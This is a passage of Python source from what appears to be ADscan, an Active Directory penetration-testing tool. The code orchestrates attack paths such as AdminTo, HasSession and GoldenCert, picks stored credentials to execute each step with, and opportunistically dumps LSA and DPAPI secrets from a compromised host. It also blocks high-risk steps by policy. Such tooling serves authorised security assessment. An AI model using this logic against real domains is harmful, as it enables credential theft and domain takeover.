    if selected is None or selected >= len(options) - 1:
        return None
    return candidates[selected][0]


def _find_previous_adminto_exec_user_for_host(
    shell: Any,
    *,
    domain: str,
    steps: list[dict[str, Any]],
    current_step_index: int,
    target_host: str,
) -> str | None:
    """Return the best prior AdminTo source user for the same target host.

    Preference order:
    1) nearest previous AdminTo with ``status=success`` and stored credential
    2) nearest previous AdminTo with any status and stored credential
    """
    target_host_clean = str(target_host or "").strip().lower()
    if not target_host_clean:
        return None

    fallback_user: str | None = None
    for index in range(current_step_index - 1, -1, -1):
        step = steps[index]
        if not isinstance(step, dict):
            continue
        action = str(step.get("action") or "").strip().lower()
        if action != "adminto":
            continue
        details = step.get("details") if isinstance(step.get("details"), dict) else {}
        from_label = str(details.get("from") or "").strip()
        to_label = str(details.get("to") or "").strip()
        if not from_label or not to_label:
            continue
        resolved_target = resolve_netexec_target_for_node_label(
            shell, domain, node_label=to_label
        )
        if not isinstance(resolved_target, str) or not resolved_target.strip():
            continue
        if resolved_target.strip().lower() != target_host_clean:
            continue

        candidate_user = _normalize_account(from_label)
        if not _is_valid_domain_username(candidate_user):
            continue
        if not _resolve_domain_password(shell, domain, candidate_user):
            continue

        step_status = str(step.get("status") or "discovered").strip().lower()
        if step_status == "success":
            marked_user = mark_sensitive(candidate_user, "user")
            marked_host = mark_sensitive(target_host, "hostname")
            print_info_debug(
                "[hassession] Selected executor from previous successful AdminTo: "
                f"{marked_user} -> {marked_host}"
            )
            return candidate_user
        if fallback_user is None:
            fallback_user = candidate_user

    if fallback_user:
        marked_user = mark_sensitive(fallback_user, "user")
        marked_host = mark_sensitive(target_host, "hostname")
        print_info_debug(
            "[hassession] Selected executor from previous AdminTo candidate: "
            f"{marked_user} -> {marked_host}"
        )
    return fallback_user


def _resolve_hassession_execution_user(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    steps: list[dict[str, Any]],
    current_step_index: int,
    target_host: str,
    from_label: str,
    context_username: str | None,
    context_password: str | None,
) -> tuple[str | None, str | None, str]:
    """Resolve executor credential context for HasSession exploitation."""
    candidates = _collect_previous_host_access_candidates(
        shell,
        domain=domain,
        steps=steps,
        current_step_index=current_step_index,
        target_host=target_host,
        context_username=context_username,
        context_password=context_password,
    )
    if candidates:
        selected_user = _select_candidate_executor_user(shell, candidates=candidates)
        if not selected_user:
            return None, None, "cancelled"
        password = _resolve_exec_password_for_user(
            shell,
            domain=domain,
            username=selected_user,
            context_username=context_username,
            context_password=context_password,
        )
        if password:
            reason_map = {user: reason for user, reason in candidates}
            return selected_user, password, reason_map.get(
                selected_user, "previous_host_access"
            )

    exec_username = _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )
    if not exec_username:
        return None, None, "unresolved"
    password = _resolve_exec_password_for_user(
        shell,
        domain=domain,
        username=exec_username,
        context_username=context_username,
        context_password=context_password,
    )
    return exec_username, password, "generic_context"


def _resolve_domain_admin_group_candidates(shell: Any, domain: str) -> list[str]:
    """Return candidate localized names for the Domain Admins group."""
    candidates: list[str] = []
    resolved = resolve_group_name_by_rid(shell, domain, 512)
    if isinstance(resolved, str) and resolved.strip():
        candidates.append(resolved.strip())
    candidates.extend(["Domain Admins", "Admins. del dominio"])

    unique: list[str] = []
    seen: set[str] = set()
    for name in candidates:
        normalized = str(name or "").strip()
        key = normalized.lower()
        if not normalized or key in seen:
            continue
        seen.add(key)
        unique.append(normalized)
    return unique


def _resolve_hassession_verify_delay_seconds(shell: Any | None = None) -> float:
    """Return post-add delay before verifying HasSession Domain Admin membership."""
    interactive_default = 0.0 if is_non_interactive(shell) else 3.0
    raw = str(os.getenv("ADSCAN_HASSESSION_VERIFY_DELAY_SECONDS", "")).strip()
    if not raw:
        return interactive_default
    try:
        value = float(raw)
    except ValueError:
        print_info_debug(
            "[hassession] Invalid ADSCAN_HASSESSION_VERIFY_DELAY_SECONDS value; "
            f"using default {interactive_default:.1f}s."
        )
        return interactive_default
    if value < 0:
        return 0.0
    return min(value, 30.0)


def _wait_for_hassession_membership_propagation(
    shell: Any,
    *,
    domain: str,
    target_user: str,
) -> None:
    """Wait briefly for AD membership propagation before verification checks."""
    delay_seconds = _resolve_hassession_verify_delay_seconds(shell)
    if delay_seconds <= 0:
        return
    marked_user = mark_sensitive(target_user, "user")
    marked_domain = mark_sensitive(domain, "domain")
    print_info_debug(
        "[hassession] Waiting "
        f"{delay_seconds:.1f}s before verifying Domain Admin membership for "
        f"{marked_user}@{marked_domain}."
    )
    time.sleep(delay_seconds)


def _is_user_domain_admin_via_sid(
    shell: Any,
    *,
    domain: str,
    target_user: str,
    auth_username: str,
    auth_password: str,
) -> bool | None:
    """Verify Domain Admin membership via recursive LDAP SID resolution."""
    try:
        from adscan_internal.cli.ldap import get_recursive_principal_group_sids_in_chain
        from adscan_internal.services.privileged_group_classifier import (
            classify_privileged_membership_from_group_sids,
        )

        group_sids = get_recursive_principal_group_sids_in_chain(
            shell,
            domain=domain,
            target_samaccountname=target_user,
            auth_username=auth_username,
            auth_password=auth_password,
            retries=4,
            retry_delay_seconds=1.0,
            retry_backoff=1.75,
            retry_on_empty=True,
            prefer_kerberos=True,
            allow_ntlm_fallback=True,
        )
        if group_sids is None:
            return None
        if not group_sids:
            return False
        membership = classify_privileged_membership_from_group_sids(group_sids)
        return bool(membership.domain_admin)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        marked_user = mark_sensitive(target_user, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_info_debug(
            "[hassession] Failed to verify Domain Admin membership for "
            f"{marked_user}@{marked_domain}: {exc}"
        )
        return None


def _find_next_step_by_action(
    steps: list[dict[str, Any]],
    *,
    start_index: int,
    action_key: str,
) -> tuple[int, dict[str, Any]] | None:
    """Return the next step matching ``action_key`` after ``start_index``."""
    needle = str(action_key or "").strip().lower()
    if not needle:
        return None
    for idx in range(start_index + 1, len(steps)):
        step = steps[idx]
        if not isinstance(step, dict):
            continue
        step_action = str(step.get("action") or "").strip().lower()
        if step_action != needle:
            continue
        return idx, step
    return None


def _attempt_post_adminto_credential_harvest(
    shell: Any,
    *,
    domain: str,
    steps: list[dict[str, Any]],
    current_step_index: int,
    compromised_host_label: str,
    exec_username: str,
    exec_password: str,
    resolved_target_host: str,
) -> None:
    """Try to harvest host creds after AdminTo when a later GoldenCert needs them.

    This is a best-effort optimization for mixed paths such as:
    ``... -> AdminTo -> COMPUTER$ -> GoldenCert -> Domain``.
    """
    if str(os.getenv("ADSCAN_ATTACK_PATH_POST_ADMINTO_HARVEST", "1")).strip().lower() not in {
        "1",
        "true",
        "yes",
        "on",
    }:
        return

    next_goldencert = _find_next_step_by_action(
        steps, start_index=current_step_index, action_key="goldencert"
    )
    if not next_goldencert:
        return

    _, golden_step = next_goldencert
    golden_status = str(golden_step.get("status") or "discovered").strip().lower()
    if golden_status == "success":
        return

    details = golden_step.get("details") if isinstance(golden_step.get("details"), dict) else {}
    golden_from_label = str(details.get("from") or "").strip()
    if not golden_from_label:
        return

    golden_exec_user = _normalize_account(golden_from_label)
    if not golden_exec_user.endswith("$"):
        return

    if _resolve_domain_password(shell, domain, golden_exec_user):
        return

    host_target = resolved_target_host.strip()
    if not host_target:
        host_target = (
            resolve_netexec_target_for_node_label(
                shell, domain, node_label=compromised_host_label
            )
            or ""
        ).strip()
    if not host_target:
        return

    marked_host = mark_sensitive(host_target, "hostname")
    marked_user = mark_sensitive(golden_exec_user, "user")
    print_info(
        "AdminTo verified. Trying opportunistic host credential collection "
        f"on {marked_host} for upcoming GoldenCert ({marked_user})."
    )

    dump_lsa = getattr(shell, "dump_lsa", None)
    if callable(dump_lsa):
        try:
            try:
                dump_lsa(
                    domain,
                    exec_username,
                    exec_password,
                    host_target,
                    "false",
                    include_machine_accounts=True,
                )
            except TypeError:
                # Backward compatibility for test doubles/older shell shims.
                dump_lsa(domain, exec_username, exec_password, host_target, "false")
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(
                f"[attack_path] Post-AdminTo LSA harvest failed: {exc}"
            )

    if _resolve_domain_password(shell, domain, golden_exec_user):
        marked_user = mark_sensitive(golden_exec_user, "user")
        print_info(
            f"Recovered credential for {marked_user} after AdminTo host collection."
        )
        return

    dump_dpapi = getattr(shell, "dump_dpapi", None)
    if callable(dump_dpapi):
        try:
            dump_dpapi(domain, exec_username, exec_password, host_target, "false")
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(
                f"[attack_path] Post-AdminTo DPAPI harvest failed: {exc}"
            )

    if _resolve_domain_password(shell, domain, golden_exec_user):
        marked_user = mark_sensitive(golden_exec_user, "user")
        print_info(
            f"Recovered credential for {marked_user} after AdminTo host collection."
        )
        return

    marked_user = mark_sensitive(golden_exec_user, "user")
    print_warning(
        "AdminTo was successful, but no credential was recovered for "
        f"{marked_user}. GoldenCert may fail."
    )


def execute_selected_attack_path(
    shell: Any,
    domain: str,
    *,
    summary: dict[str, Any],
    context_username: str | None = None,
    context_password: str | None = None,
    search_mode_label: str | None = None,
) -> bool:
    """Execute a selected attack path (best-effort).

    Currently supported step mappings:
    - AllowedToDelegate -> `shell.enum_delegations_user`

    Returns:
        True if an execution attempt was started, False otherwise.
    """
    set_attack_path_execution(shell)
    local_cleanup_scope_id: str | None = None
    cleanup_scope_owner = False
    try:
        if not has_active_cleanup_scope(shell):
            local_cleanup_scope_id = begin_cleanup_scope(
                shell,
                label="attack_path_execution",
                domain=domain,
            )
            cleanup_scope_owner = True

        is_pivot_search = str(search_mode_label or "").strip().lower() == "pivot search"

        non_executable_actions = CONTEXT_ONLY_RELATIONS
        dangerous_actions = POLICY_BLOCKED_RELATIONS
        supported_actions = SUPPORTED_RELATION_NOTES

        steps = summary.get("steps")

        @contextmanager
        def _active_step_context(
            *,
            action: str,
            from_label: str,
            to_label: str,
            notes: dict[str, object] | None = None,
        ):
            if hasattr(shell, "_set_active_attack_graph_step"):
                shell._set_active_attack_graph_step(  # type: ignore[attr-defined]
                    domain=domain,
                    from_label=from_label,
                    relation=action,
                    to_label=to_label,
                    notes=notes or {},
                )
            try:
                yield
            finally:
                if hasattr(shell, "_clear_active_attack_graph_step"):
                    try:
                        shell._clear_active_attack_graph_step()  # type: ignore[attr-defined]
                    except Exception as exc:  # noqa: BLE001
                        telemetry.capture_exception(exc)

        def _mark_blocked_step(
            action: str,
            from_label: str,
            to_label: str,
            *,
            kind: str,
            reason: str,
        ) -> None:
            if not from_label or not to_label:
                return
            desired_status = "blocked"
            kind_norm = (kind or "").strip().lower()
            if kind_norm == "unavailable":
                desired_status = "unavailable"
            elif kind_norm == "unsupported":
                desired_status = "unsupported"
            try:
                update_edge_status_by_labels(
                    shell,
                    domain,
                    from_label=from_label,
                    relation=action,
                    to_label=to_label,
                    status=desired_status,
                    notes={"blocked_kind": kind, "reason": reason},
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)

        def _mark_blocked_steps(
            *,
            kinds: dict[str, str],
            kind_label: str,
            default_reason: str,
        ) -> None:
            if not isinstance(steps, list):
                return
            for step_item in steps:
                if not isinstance(step_item, dict):
                    continue
                action = str(step_item.get("action") or "").strip()
                key = action.lower()
                if key not in kinds:
                    continue
                details = (
                    step_item.get("details")
                    if isinstance(step_item.get("details"), dict)
                    else {}
                )
                from_label = str(details.get("from") or "")
                to_label = str(details.get("to") or "")
                _mark_blocked_step(
                    action,
                    from_label,
                    to_label,
                    kind=kind_label,
                    reason=kinds.get(key, default_reason),
                )

        actions: list[str] = []
        if isinstance(steps, list):
            for step in steps:
                if isinstance(step, dict):
                    action = str(step.get("action") or "").strip()
                    if action:
                        actions.append(action)
        unique_actions = sorted({a for a in actions}, key=str.lower)

        blocked = [
            a
            for a in unique_actions
            if classify_relation_support(a).kind == "policy_blocked"
        ]
        unsupported = [
            a
            for a in unique_actions
            if classify_relation_support(a).kind == "unsupported"
        ]

        if blocked:
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="path_blocked",
                message="Attack path execution blocked by policy-protected steps.",
                step_status="blocked",
                reason=", ".join(blocked),
            )
            _mark_blocked_steps(
                kinds={k: v for k, v in dangerous_actions.items()},
                kind_label="dangerous",
                default_reason="High-risk / potentially disruptive",
            )
            table = Table(
                title=Text(
                    "Steps in this path", style=f"bold {BRAND_COLORS['warning']}"
                ),
                show_header=True,
                header_style=f"bold {BRAND_COLORS['warning']}",
                show_lines=True,
            )
            table.add_column("#", style="dim", width=4, justify="right")
            table.add_column("Action", style="bold")
            table.add_column("Executable", style="bold", width=11, justify="center")
            table.add_column("Notes", style="dim", overflow="fold")

            if isinstance(steps, list) and steps:
                for idx, step in enumerate(steps, start=1):
                    action = (
                        str(step.get("action") or "").strip()
                        if isinstance(step, dict)
                        else ""
                    )
                    key = action.lower()
                    if key in supported_actions:
                        executable_label = Text("Yes", style="bold green")
                        notes = supported_actions.get(key, "")
                    elif key in non_executable_actions:
                        executable_label = Text("N/A", style="bold cyan")
                        notes = non_executable_actions.get(key, "")
                    elif key in dangerous_actions:
                        executable_label = Text("No", style="bold yellow")
                        notes = dangerous_actions.get(key, "")
                    else:
                        executable_label = Text("No", style="bold red")
                        notes = "Not implemented yet in ADscan"
                    table.add_row(str(idx), action or "N/A", executable_label, notes)
            else:
                table.add_row(
                    "1", "N/A", Text("No", style="bold red"), "No steps available"
                )

            message = Text()
            message.append(
                "Execution disabled for this attack path.\n\n", style="bold yellow"
            )
            message.append(
                "This path contains high-risk steps that ADscan intentionally does not run automatically.\n",
                style="yellow",
            )
            message.append(
                "You can still inspect the steps and decide if you want to perform them manually.\n",
                style="dim",
            )
            if blocked:
                message.append(
                    f"\nBlocked actions: {', '.join(blocked)}\n",
                    style="dim",
                )

            print_panel(
                [message, table],
                title=Text("Attack Path Execution Disabled", style="bold yellow"),
                border_style="yellow",
                expand=False,
            )
            return False

        if unsupported:
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="path_blocked",
                message="Attack path execution blocked because one or more steps are not implemented.",
                step_status="blocked",
                reason=", ".join(unsupported),
            )
            unsupported_actions = {
                str(action).strip().lower(): "Not implemented yet in ADscan"
                for action in unsupported
            }
            _mark_blocked_steps(
                kinds=unsupported_actions,
                kind_label="unsupported",
                default_reason="Not implemented yet in ADscan",
            )
            table = Table(
                title=Text("Steps in this path", style=f"bold {BRAND_COLORS['info']}"),
                show_header=True,
                header_style=f"bold {BRAND_COLORS['info']}",
                show_lines=True,
            )
            table.add_column("#", style="dim", width=4, justify="right")
            table.add_column("Action", style="bold")
            table.add_column("Supported", style="bold", width=10, justify="center")
            table.add_column("Notes", style="dim", overflow="fold")

            if isinstance(steps, list) and steps:
                for idx, step in enumerate(steps, start=1):
                    action = (
                        str(step.get("action") or "").strip()
                        if isinstance(step, dict)
                        else ""
                    )
                    key = action.lower()
                    if key in supported_actions:
                        supported_label = Text("Yes", style="bold green")
                        notes = supported_actions.get(key, "")
                    elif key in non_executable_actions:
                        supported_label = Text("N/A", style="bold cyan")
                        notes = non_executable_actions.get(key, "")
                    elif key in dangerous_actions:
                        supported_label = Text("No", style="bold yellow")
                        notes = dangerous_actions.get(key, "")
                    else:
                        supported_label = Text("No", style="bold red")
                        notes = "Not implemented yet in ADscan"
                    table.add_row(str(idx), action or "N/A", supported_label, notes)
            else:
                table.add_row(
                    "1", "N/A", Text("No", style="bold red"), "No steps available"
                )

            message = Text()
            message.append(
                "This attack path can't be executed yet.\n\n", style="bold red"
            )
            message.append(
                "ADscan does not have an exploitation implementation for this path yet. "
                "You can still inspect it and choose another one.\n",
                style="red",
            )
            if unique_actions:
                message.append(
                    f"\nDetected actions: {', '.join(unique_actions)}\n",
                    style="dim",
                )
            message.append(
                "\nTip: pick a path that contains only supported actions, "
                "or continue with other enumeration steps.",
                style="dim",
            )

            print_panel(
                [message, table],
                title=Text("Attack Path Not Implemented", style="bold red"),
                border_style="red",
                expand=False,
            )
            return False

        execution_started = False
        implicitly_satisfied_step_indices: set[int] = set()
        if not isinstance(steps, list) or not steps:
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="path_unavailable",
                message="Attack path execution unavailable because no steps were present.",
                step_status="unavailable",
                reason="no_steps_available",
            )
            print_warning("Cannot execute this path: no steps available.")
            return False

        # Precompute the last executable step index to avoid offering follow-ups
        # in the middle of a path (which can cause duplication or re-ordering).
        executable_indices: list[int] = []
        for step_idx, step_item in enumerate(steps, start=1):
            if not isinstance(step_item, dict):
                continue
            step_action = str(step_item.get("action") or "").strip()
            step_key = step_action.lower()
            if step_key in non_executable_actions:
                continue
            if step_key in dangerous_actions:
                continue
            executable_indices.append(step_idx)
        last_executable_idx = executable_indices[-1] if executable_indices else 0
        resume_from_step_idx = _resolve_attack_path_start_step(
            shell,
            domain=domain,
            steps=steps,
            executable_indices=executable_indices,
            non_executable_actions=non_executable_actions,
            dangerous_actions=dangerous_actions,
            summary=summary,
            context_username=context_username,
            context_password=context_password,
        )
        if resume_from_step_idx is None:
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="path_cancelled",
                message="Attack path execution cancelled before any step was started.",
                step_status="cancelled",
            )
            return False

        total_executable_steps = _count_executable_steps(
            steps,
            non_executable_actions=non_executable_actions,
            dangerous_actions=dangerous_actions,
        )
        _record_attack_path_execution_event(
            shell,
            domain=domain,
            summary=summary,
            event_stage="path_started",
            message="Attack path execution started.",
            step_index=resume_from_step_idx,
            total_steps=total_executable_steps,
            last_executable_idx=last_executable_idx,
            step_status="running",
        )
        _attempt_writelogonscript_cleanup_if_ready(
            shell,
            domain=domain,
            summary=summary,
        )

        def _run_runtime_followups(
            *,
            step_action: str,
            target_label_value: str,
            initial_followups: list[Any] | None = None,
            last_outcome: dict[str, Any] | None = None,
        ) -> None:
            """Render and execute runtime follow-ups for a successful terminal step."""
            followups = list(initial_followups or [])
            outcome_followups: list[Any] = []
            effective_outcome = (
                dict(last_outcome)
                if isinstance(last_outcome, dict)
                else (get_last_ace_execution_outcome(shell) or {})
            )
            outcome_key = str(effective_outcome.get("key") or "").strip().lower()
            marked_outcome_domain = mark_sensitive(domain, "domain")
            print_info_debug(
                "[attack_paths] outcome follow-up evaluation: "
                f"domain={marked_outcome_domain} pivot={is_pivot_search!r} "
                f"outcome_key={mark_sensitive(str(outcome_key or 'none'), 'detail')}"
            )
            should_evaluate_outcome_followups = is_pivot_search or outcome_key in {
                "rbcd_prepared",
                "rodc_host_access_prepared",
            }
            if should_evaluate_outcome_followups:
                if outcome_key != "user_credential_obtained":
                    outcome_followups = build_followups_for_execution_outcome(
                        shell,
                        outcome=effective_outcome,
                    )
                else:
                    followup_context = get_attack_path_followup_context(shell)
                    compromised_user = _normalize_account(
                        str(effective_outcome.get("compromised_user") or "")
                    )
                    print_info_debug(
                        "[attack_paths] user-credential outcome follow-ups "
                        "deferred to credential-ingestion flow: "
                        f"user={mark_sensitive(compromised_user or 'unknown', 'user')} "
                        f"nested_followup_active={bool(followup_context)!r} "
                        f"context={mark_sensitive(str(followup_context or {}), 'detail')}"
                    )
                print_info_debug(
                    "[attack_paths] outcome follow-ups resolved: "
                    f"domain={marked_outcome_domain} count={len(outcome_followups)}"
                )
            if outcome_followups:
                mandatory_outcome_followups = [
                    item for item in outcome_followups if item.key == "refresh_ticket"
                ]
                optional_outcome_followups = [
                    item for item in outcome_followups if item.key != "refresh_ticket"
                ]
                for item in mandatory_outcome_followups:
                    item.handler()
                followups.extend(optional_outcome_followups)
            if not followups:
                return

            execute_guided_followup_actions(
                shell,
                step_action=step_action,
                target_label=target_label_value,
                followups=followups,
            )

        def _apply_execution_outcome_context_handoff(
            outcome: dict[str, Any] | None,
        ) -> None:
            """Update the in-path execution context after obtaining a new user credential."""
            nonlocal context_username, context_password

            if not isinstance(outcome, dict):
                return
            if str(outcome.get("key") or "").strip().lower() != "user_credential_obtained":
                return

            compromised_user = _normalize_account(
                str(outcome.get("compromised_user") or "")
            )
            credential = str(outcome.get("credential") or "").strip()
            if not compromised_user or not credential:
                print_info_debug(
                    "[attack_paths] skipping execution-context handoff for user outcome "
                    "(missing compromised_user or credential)."
                )
                return

            previous_user = _normalize_account(context_username or "")
            context_username = compromised_user
            context_password = credential
            marked_user = mark_sensitive(compromised_user, "user")
            followup_context = get_attack_path_followup_context(shell)
            print_info_debug(
                "[attack_paths] execution context handed off to newly compromised user: "
                f"previous_user={mark_sensitive(previous_user or 'none', 'detail')} "
                f"new_user={marked_user} "
                f"nested_followup_active={bool(followup_context)!r} "
                f"context={mark_sensitive(str(followup_context or {}), 'detail')}"
            )

        def _mark_step_implicitly_satisfied(
            *,
            step_index: int,
            status: str,
            notes: dict[str, Any] | None = None,
        ) -> None:
            """Mark one step as satisfied by another action during the same execution."""
            implicitly_satisfied_step_indices.add(step_index + 1)
            _update_attack_path_step_status_at_index(
                shell,
                domain=domain,
                summary=summary,
                step_index=step_index,
                status=status,
                notes=notes,
            )

        def _apply_chained_step_execution_result(
            *,
            source_action: str,
            source_from_label: str,
            source_to_label: str,
            execution_result: dict[str, Any],
        ) -> bool:
            """Apply one chained-step result produced by the active step.

            Returns ``True`` when the attack path should continue automatically.
            """
            chained_step_index = int(execution_result.get("step_index") or -1)
            chained_status = str(execution_result.get("status") or "").strip().lower()
            chained_action = str(execution_result.get("action") or "").strip()
            chained_from_label = str(execution_result.get("from_label") or "").strip()
            chained_to_label = str(execution_result.get("to_label") or "").strip()
            chained_notes = (
                dict(execution_result.get("notes"))
                if isinstance(execution_result.get("notes"), dict)
                else {}
            )
            if chained_step_index < 0 or not chained_status:
                return False

            if chained_status == "success":
                _mark_step_implicitly_satisfied(
                    step_index=chained_step_index,
                    status="success",
                    notes=chained_notes,
                )
                _record_attack_path_execution_event(
                    shell,
                    domain=domain,
                    summary=summary,
                    event_stage="step_succeeded",
                    message=(
                        f"{chained_action or 'Chained step'} succeeded against "
                        f"{chained_to_label or 'the downstream target'} via {source_action}."
                    ),
                    step_index=chained_step_index + 1,
                    total_steps=total_executable_steps,
                    executable_step_index=chained_step_index + 1,
                    last_executable_idx=last_executable_idx,
                    action=chained_action,
                    from_label=chained_from_label,
                    to_label=chained_to_label,
                    step_status="success",
                    actor=str(execution_result.get("actor") or ""),
                    reason=str(
                        execution_result.get("reason")
                        or f"executed_via_{source_action.lower()}"
                    ),
                )
                follow_on_outcome = execution_result.get("follow_on_outcome")
                if isinstance(follow_on_outcome, dict):
                    _apply_execution_outcome_context_handoff(follow_on_outcome)
                return True

            _update_attack_path_step_status_at_index(
                shell,
                domain=domain,
                summary=summary,
                step_index=chained_step_index,
                status=chained_status,
                notes=chained_notes,
            )
            _record_attack_path_execution_event(
                shell,
                domain=domain,
                summary=summary,
                event_stage="step_failed"
                if chained_status == "failed"
                else "step_blocked"
                if chained_status == "blocked"
                else "step_started",
                message=(
                    f"{chained_action or 'Chained step'} ended with status "
                    f"{chained_status} after {source_action}."
                ),
                step_index=chained_step_index + 1,
                total_steps=total_executable_steps,
                executable_step_index=chained_step_index + 1,
                last_executable_idx=last_executable_idx,
                action=chained_action,
                from_label=chained_from_label,
                to_label=chained_to_label,
                step_status=chained_status,
                actor=str(execution_result.get("actor") or ""),
                reason=str(
                    execution_result.get("reason")
                    or f"{chained_status}_via_{source_action.lower()}"
                ),
            )
            return False

        def _confirm_step_rerun(prompt: str, *, default: bool) -> bool:
            """Return a rerun decision while honoring non-interactive defaults."""
            if hasattr(shell, "_questionary_confirm"):
                resolved = shell._questionary_confirm(
                    prompt,
                    default=default,
                    timeout_result=False,
                    context={
                        "remote_interaction": True,
                        "category": "attack_path_execution",
                        "domain": domain,
                    },
                )
                if isinstance(resolved, bool):
                    return resolved
            if is_non_interactive(shell):
                print_info_debug(
                    "[attack_paths] step rerun defaulted (non-interactive): "
                    f"domain={mark_sensitive(domain, 'domain')} "
                    f"prompt={mark_sensitive(prompt, 'detail')} default={default!r}"
                )
                return default
            return Confirm.ask(prompt, default=default)

        def _decide_existing_step_handling(
            *,
            step: dict[str, Any],
            step_index: int,
            action: str,
            from_label: str,
            to_label: str,
        ) -> str:
            """Return `execute`, `skip`, or `cancel` for one previously processed step."""
            status = str(step.get("status") or "").strip().lower()
            if status not in {"success", "attempted"}:
                return "execute"
            if step_index in implicitly_satisfied_step_indices:
                print_info_debug(
                    "[attack_paths] skipping implicitly satisfied step in current execution: "
                    f"index={step_index} status={mark_sensitive(status, 'detail')} "
                    f"action={mark_sensitive(action or 'N/A', 'detail')}"
                )
                return "skip"
            if status == "success" and _env_flag_enabled(
                "ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS"
            ):
                print_info_debug(
                    "[attack_paths] forcing success-step re-execution via env flag: "
                    f"index={step_index} action={mark_sensitive(action or 'N/A', 'detail')}"
                )
                return "execute"

            bypassable = _attack_path_processed_step_is_bypassable(
                shell,
                domain=domain,
                summary=summary,
                steps=steps,
                executable_indices=executable_indices,
                step_index=step_index,
                step_status=status,
                context_username=context_username,
                context_password=context_password,
            )
            if bypassable:
                if status == "success":
                    prompt = (
                        f"Step #{step_index} ({action}) is already marked success and "
                        "ADscan can continue without re-running it. Re-run it anyway?"
                    )
                else:
                    prompt = (
                        f"Step #{step_index} ({action}) was already attempted, but ADscan "
                        "can continue without re-running it. Re-run it anyway?"
                    )
            elif status == "success":
                prompt = (
                    f"Step #{step_index} ({action}) is marked success, but ADscan cannot "
                    "continue from it with the currently available credentials. Re-run it now?"
                )
            else:
                prompt = (
                    f"Step #{step_index} ({action}) was already attempted and ADscan cannot "
                    "continue past it with the currently available credentials. Retry it now?"
                )
            rerun = _confirm_step_rerun(prompt, default=False)
            print_info_debug(
                "[attack_paths] existing-step rerun decision: "
                f"index={step_index} status={mark_sensitive(status, 'detail')} "
                f"action={mark_sensitive(action or 'N/A', 'detail')} "
                f"from={mark_sensitive(from_label or 'N/A', 'node')} "
                f"to={mark_sensitive(to_label or 'N/A', 'node')} "
                f"bypassable={bypassable!r} "
                f"rerun={rerun!r}"
            )
            if rerun:
                return "execute"
            if bypassable:
                return "skip"
            return "cancel"

        for idx, step in enumerate(steps, start=1):
            if not isinstance(step, dict):
                continue
            if idx < resume_from_step_idx:
                continue
            action = str(step.get("action") or "").strip()
            key = action.lower()
            if key in non_executable_actions:
                # Context-only edge (e.g. membership expansion), skip execution.
                continue
            if key in dangerous_actions:
                # High-risk step intentionally disabled.
                return execution_started
            relation_support = classify_relation_support(key)
            set_attack_path_step_context(
                shell,
                search_mode_label=search_mode_label,
                step_index=idx,
                last_executable_idx=last_executable_idx,
                compromise_semantics=relation_support.compromise_semantics,
                compromise_effort=relation_support.compromise_effort,
                effective_target_basis_kind=str(
                    summary.get("effective_target_basis_kind") or ""
                ),
                effective_target_basis_primary=(
                    summary.get("effective_target_basis_primary")
                    if isinstance(summary.get("effective_target_basis_primary"), dict)
                    else None
                ),
                target_terminal_class=str(summary.get("target_terminal_class") or ""),
                target_followup_status=str(summary.get("target_followup_status") or ""),
            )
            details = (
                step.get("details") if isinstance(step.get("details"), dict) else {}
            )
            from_label = str(details.get("from") or "")
            to_label = str(details.get("to") or "")
            existing_step_decision = _decide_existing_step_handling(
                step=step,
                step_index=idx,
                action=action,
                from_label=from_label,
                to_label=to_label,
            )
            if existing_step_decision == "skip":
                print_info_debug(
                    "[attack_paths] skipping previously processed step: "
                    f"index={idx} status={mark_sensitive(str(step.get('status') or ''), 'detail')} "
                    f"action={mark_sensitive(action, 'detail')} "
                    f"from={mark_sensitive(from_label or 'N/A', 'node')} "
                    f"to={mark_sensitive(to_label or 'N/A', 'node')}"
                )
                continue
            if existing_step_decision == "cancel":
                print_info_debug(
                    "[attack_paths] cancelling path execution because a previously processed "
                    "step cannot be bypassed with the current credentials: "
                    f"index={idx} action={mark_sensitive(action, 'detail')}"
                )
                return execution_started
            executable_step_position = 0
            if executable_indices:
                try:
                    executable_step_position = executable_indices.index(idx) + 1
                except ValueError:
                    executable_step_position = 0

            if key in {"adminto", "sqladmin", "canrdp", "canpsremote"}:
                if not to_label:
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: missing target host.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="missing_target_host",
                    )
                    print_warning(f"Cannot execute {action}: missing target host.")
                    return execution_started

                # Prefer the credential context (e.g. from `ask_for_user_privs`). Otherwise,
                # attempt to use the credential for the source node, and finally fall back
                # to one of the "applies_to" usernames when available (owned/group paths).
                exec_username = _resolve_execution_user(
                    shell,
                    domain=domain,
                    context_username=context_username,
                    summary=summary,
                    from_label=from_label,
                )

                password = context_password or _resolve_domain_password(
                    shell, domain, exec_username
                )
                if not exec_username or not password:
                    marked_user = mark_sensitive(exec_username or from_label, "user")
                    _record_attack_path_execution_event(
                        shell,
                        domain=domain,
                        summary=summary,
                        event_stage="step_blocked",
                        message=f"Cannot execute {action}: no usable credential context was available.",
                        step_index=idx,
                        total_steps=total_executable_steps,
                        executable_step_index=executable_step_position,
                        last_executable_idx=last_executable_idx,
                        action=action,
                        from_label=from_label,
                        to_label=to_label,
                        step_status="blocked",
                        reason="missing_execution_credential",
                    )
                    print_warning(
                        f"Cannot execute this step: no stored domain credential found for {marked_user}."
                    )
                    _mark_blocked_step(
                        action,
                        from_label,
                        to_label,
                        kind="unavailable",
                        reason="Missing credential context for execution",
                    )
                    return execution_started

                # Resolve a usable NetExec target (FQDN), falling back when needed.
